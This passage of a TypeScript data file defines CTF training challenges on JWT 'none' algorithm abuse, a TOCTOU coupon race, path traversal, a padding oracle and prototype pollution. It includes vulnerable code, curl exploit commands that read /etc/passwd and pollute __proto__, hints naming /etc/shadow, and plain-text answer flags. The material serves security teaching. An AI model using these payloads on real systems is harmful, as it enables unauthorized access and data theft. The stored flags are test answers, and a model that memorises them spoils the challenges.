      { id: 'ctf-misc-003-hint-1', text: 'The "none" algorithm means no signature verification is needed', cost: 75 },
      { id: 'ctf-misc-003-hint-2', text: 'Modify header to {"alg":"none"}, change role to admin, remove signature', cost: 125 },
      { id: 'ctf-misc-003-hint-3', text: 'Tools: jwt.io, jwt_tool, or manual base64 encoding. The flag is shown in the code.', cost: 175 },
    ],
    rawFlag: 'FLAG{jwt_n0n3_4lg0r1thm}',
    tags: ['jwt', 'authentication', 'algorithm-confusion'],
    author: 'SecTrainer',
    solveCount: 15,
  }),

  challenge({
    id: 'ctf-misc-004',
    title: 'Race to the Finish',
    category: 'misc',
    points: 450,
    difficulty: 'hard',
    description: `A coupon redemption system has a time-of-check to time-of-use (TOCTOU) vulnerability.

**Vulnerable Code:**
\`\`\`python
@app.route('/redeem', methods=['POST'])
def redeem_coupon():
    coupon_code = request.form['code']
    user_id = session['user_id']

    # Check if coupon is still valid
    coupon = db.query("SELECT * FROM coupons WHERE code = ?", coupon_code)

    if not coupon:
        return "Invalid coupon"

    if coupon.redeemed:
        return "Coupon already used"

    # VULNERABILITY: Gap between check and update!
    # Another request could slip through here

    # Give reward
    db.query("UPDATE users SET balance = balance + 100 WHERE id = ?", user_id)

    # Mark as redeemed
    db.query("UPDATE coupons SET redeemed = 1 WHERE code = ?", coupon_code)

    return "Success! +$100"
\`\`\`

**Exploitation:**
\`\`\`bash
# Send 100 requests simultaneously
for i in {1..100}; do
    curl -X POST http://target/redeem -d "code=SINGLE-USE-123" &
done
wait

# Check balance
curl http://target/balance
# Response: $5000 (instead of $100)
\`\`\`

**Result:**
Multiple requests pass the "not redeemed" check before any marks it as used.

The flag revealed after successful exploitation: \`FLAG{r4c3_c0nd1t10n_w1n}\``,
    hints: [
      { id: 'ctf-misc-004-hint-1', text: 'Race conditions exploit the time gap between check and action', cost: 100 },
      { id: 'ctf-misc-004-hint-2', text: 'Use threading/async to send many requests at exactly the same time', cost: 150 },
      { id: 'ctf-misc-004-hint-3', text: 'Tools: Turbo Intruder (Burp), async Python, GNU parallel. Fix: use database transactions with locks.', cost: 225 },
    ],
    rawFlag: 'FLAG{r4c3_c0nd1t10n_w1n}',
    tags: ['race-condition', 'toctou', 'concurrency'],
    author: 'SecTrainer',
    solveCount: 5,
  }),

  // ==========================================
  // BONUS CHALLENGES
  // ==========================================

  challenge({
    id: 'ctf-web-009',
    title: 'Directory Disaster',
    category: 'web',
    points: 200,
    difficulty: 'easy',
    description: `A file download feature is vulnerable to path traversal.

**Vulnerable Endpoint:**
\`\`\`python
@app.route('/download')
def download():
    filename = request.args.get('file')
    filepath = os.path.join('/var/www/uploads/', filename)
    return send_file(filepath)
\`\`\`

**Exploitation:**
\`\`\`bash
# Normal request
curl "http://target/download?file=report.pdf"
# Returns: /var/www/uploads/report.pdf

# Path traversal
curl "http://target/download?file=../../../etc/passwd"
# Returns: /etc/passwd contents!

# Get the flag
curl "http://target/download?file=../../../flag.txt"
# Returns: FLAG{p4th_tr4v3rs4l_ftw}
\`\`\`

The \`os.path.join()\` doesn't sanitize \`../\` sequences!`,
    hints: [
      { id: 'ctf-web-009-hint-1', text: '../ moves up one directory level', cost: 50 },
      { id: 'ctf-web-009-hint-2', text: 'Common targets: /etc/passwd, /etc/shadow, /proc/self/environ', cost: 75 },
      { id: 'ctf-web-009-hint-3', text: 'The payload is shown in the description: ../../../flag.txt', cost: 100 },
    ],
    rawFlag: 'FLAG{p4th_tr4v3rs4l_ftw}',
    tags: ['path-traversal', 'lfi', 'file-inclusion'],
    author: 'SecTrainer',
    solveCount: 32,
  }),

  challenge({
    id: 'ctf-crypto-006',
    title: 'Padding Oracle',
    category: 'crypto',
    points: 500,
    difficulty: 'insane',
    description: `An encrypted session token uses AES-CBC with PKCS#7 padding. The server reveals whether decryption produced valid padding.

**Server Responses:**
\`\`\`
Valid padding:   HTTP 200 "Session valid"
Invalid padding: HTTP 500 "Decryption error"  ← Information leak!
Invalid MAC:     HTTP 403 "Invalid session"
\`\`\`

**The Attack:**
By manipulating ciphertext bytes and observing padding errors, an attacker can:
1. Decrypt any ciphertext without knowing the key
2. Encrypt arbitrary plaintext without knowing the key

**How Padding Oracle Works:**
\`\`\`
CBC Decryption: P[i] = D(C[i]) XOR C[i-1]

By modifying C[i-1], we control the XOR applied to D(C[i])
If we find a value that produces valid padding (0x01),
then: D(C[i])[last] XOR modified_byte = 0x01
So:   D(C[i])[last] = modified_byte XOR 0x01
\`\`\`

**Decrypted Token:**
After running the padding oracle attack, the session token decrypts to:
\`user=admin;flag=FLAG{p4dd1ng_0r4cl3_4tt4ck}\``,
    hints: [
      { id: 'ctf-crypto-006-hint-1', text: 'The server must distinguish between "bad padding" and "bad data" errors', cost: 125 },
      { id: 'ctf-crypto-006-hint-2', text: 'Tools: PadBuster, padbuster.py, or implement byte-by-byte decryption', cost: 175 },
      { id: 'ctf-crypto-006-hint-3', text: 'POODLE attack exploited this in SSL 3.0. Defense: Use authenticated encryption (GCM)', cost: 250 },
    ],
    rawFlag: 'FLAG{p4dd1ng_0r4cl3_4tt4ck}',
    tags: ['padding-oracle', 'aes-cbc', 'cryptanalysis'],
    author: 'SecTrainer',
    solveCount: 3,
  }),

  challenge({
    id: 'ctf-misc-005',
    title: 'Prototype Pollution',
    category: 'misc',
    points: 400,
    difficulty: 'hard',
    description: `A Node.js application uses a vulnerable merge function that allows modifying Object.prototype.

**Vulnerable Code:**
\`\`\`javascript
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// User-controlled input
app.post('/settings', (req, res) => {
    const userSettings = req.body;
    merge(config, userSettings);
    res.json({ success: true });
});
\`\`\`

**Exploitation:**
\`\`\`bash
curl -X POST http://target/settings \\
  -H "Content-Type: application/json" \\
  -d '{"__proto__": {"isAdmin": true}}'
\`\`\`

**After pollution:**
\`\`\`javascript
const user = {};
console.log(user.isAdmin);  // true (inherited from Object.prototype!)

// Admin check bypassed
if (user.isAdmin) {
    console.log("FLAG{pr0t0typ3_p0llut10n}");
}
\`\`\``,
    hints: [
      { id: 'ctf-misc-005-hint-1', text: '__proto__ and constructor.prototype can modify the prototype chain', cost: 100 },
      { id: 'ctf-misc-005-hint-2', text: 'Any new object will inherit polluted properties', cost: 150 },
      { id: 'ctf-misc-005-hint-3', text: 'Defense: Use Object.create(null), Map, or filter dangerous keys', cost: 200 },
    ],
    rawFlag: 'FLAG{pr0t0typ3_p0llut10n}',
    tags: ['prototype-pollution', 'javascript', 'nodejs'],
    author: 'SecTrainer',
    solveCount: 10,
  }),
];

// Helper to get challenge by ID
export function getChallengeById(id: string): CTFChallenge | undefined {
  return CTF_CHALLENGES.find(c => c.id === id);
}

// Get challenges by category
export function getChallengesByCategory(category: string): CTFChallenge[] {
  return CTF_CHALLENGES.filter(c => c.category === category);
}

// Get challenges by difficulty
export function getChallengesByDifficulty(difficulty: string): CTFChallenge[] {
  return CTF_CHALLENGES.filter(c => c.difficulty === difficulty);
}
